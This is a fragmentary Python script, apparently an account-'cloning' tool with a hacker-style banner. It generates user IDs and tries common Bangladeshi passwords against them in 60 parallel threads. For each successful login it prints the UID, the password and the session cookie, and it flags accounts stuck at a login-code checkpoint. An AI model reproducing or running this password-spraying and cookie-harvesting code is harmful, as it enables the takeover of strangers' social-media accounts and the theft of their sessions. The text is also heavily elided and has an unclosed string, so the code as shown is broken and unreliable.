...
logo=("""  \33[1;91m
    ...
    ╚═╗╚╦╝║╣  ║║  ║║║╠═╣╠═╣║║║║  ║╚═╗║  ╠═╣║║║
    ╚═╝ ╩ ╚═╝═╩╝  ╩ ╩╩ ╩╩ ╩╩╝╚╝  ╩╚═╝╩═╝╩ ╩╩ ╩
\033[31;1m┃ \033[1;32m ┳┓┏┓┓┏┏┓┳┓      \033[1;96m┃ \033[33;1m OWNER  : NAYAN SEKH        \033[31;1m┃
\033[31;1m┃ \033[1;96m ┃┃┣┫┗┫┣┫┃┃      \033[1;96m┃ \033[31;1m TOOLS  : RANDOM CLONING    \033[31;1m┃
\033[31;1m┃ \033[31;1m ┛┗┛┗┗┛┛┗┛┗      \033[1;96m┃ \033[1;96m GITHUB : D4RK-H4CKER       \033[31;1m┃
\033[31;1m┃ \033[1;32m          V\033[1;32m/\033[1;32m1.3  \033[1;96m┃ \033[1;32m STATUS : COMMAND PAID      \033[31;1m┃
\033[38;5;46m==================================================""") 
#--------------------------COLOUR CODE--------------------------#
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def Broken():    
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp) 
    with ThreadPool(max_workers=60) as Broken:
        os.system('clear')
        time.sleep(0.2)
        print(logo)
        tl = str(len(user))
        ...
        for guru in user:
            ...
            pwx = [mahi+ex+new+guru,new+guru,ex+guru,mahi+ex+new,'bangla','Bangladesh','freefire','sadiya','bangladesh','sabbir','afsana','nusrat]
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\x1b[38;5;155m[➤] Broken~XD  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('')
                print(f"\x1b[1;92m[➤] Broken OK ♥︎ {uid} \x1b[1;94m•\x1b[1;32m {ps} \n\033[1;32m[COOKIE]➤ \033[1;91m {coki} \n  ")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]                    
                    print(f'\r\033[1;30m[Broken CP💔] '+uid+' [💔] '+ps+' ')                    
